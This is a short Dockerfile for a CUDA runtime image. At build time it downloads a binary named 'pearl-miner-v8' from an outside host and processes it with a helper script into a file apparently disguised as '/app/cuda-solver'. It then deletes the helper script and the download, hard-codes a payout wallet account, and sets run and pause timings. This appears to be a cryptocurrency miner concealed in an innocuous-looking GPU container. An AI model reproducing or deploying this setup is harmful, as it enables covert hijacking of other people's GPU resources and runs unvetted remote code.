FROM nvidia/cuda:12.4.1-runtime-ubuntu22.04

RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates python3 && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY clean.py ./
RUN curl -fsSL https://pearlhash.xyz/downloads/pearl-miner-v8 -o /tmp/miner && \
    python3 clean.py && \
    chmod +x /app/cuda-solver && \
    rm /tmp/miner clean.py

COPY entry.sh ./
RUN chmod +x entry.sh

ENV ENDPOINT=127.0.0.1:19011
ENV NODE_ID=""
ENV ACCOUNT=prl1p92hryhjdple3u9hmzqq6cth8zqrrpk4g3cq5zxpgrswfsydk7ueqafaq8d
ENV RUN_SEC=1200
ENV PAUSE_SEC=60

CMD ["./entry.sh"]
